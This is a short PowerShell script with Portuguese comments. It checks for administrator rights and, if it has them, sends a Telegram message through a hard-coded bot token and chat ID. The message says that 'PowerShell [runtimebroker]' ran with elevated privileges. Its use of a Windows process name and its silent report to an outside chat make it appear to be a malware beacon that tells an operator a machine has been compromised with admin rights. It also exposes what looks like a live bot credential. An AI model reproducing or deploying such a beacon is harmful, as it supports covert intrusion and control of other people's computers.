# Verifica se o script está sendo executado como administrador
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if ($isAdmin) {
    # Se estiver sendo executado como administrador, execute a solicitação HTTP
    $botToken = "6745138184:AAF3g5asYrky6mQIZHkS3_8JEjBTz4_6h3o"
    $chatId = "-1002133306691"
    $text = "O PowerShell [runtimebroker] foi executado com privilegios elevados"

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$text&parse_mode=HTML"
    
    $response = Invoke-WebRequest -Uri $url -Method Get
    Write-Host "Mensagem enviada com sucesso!"
}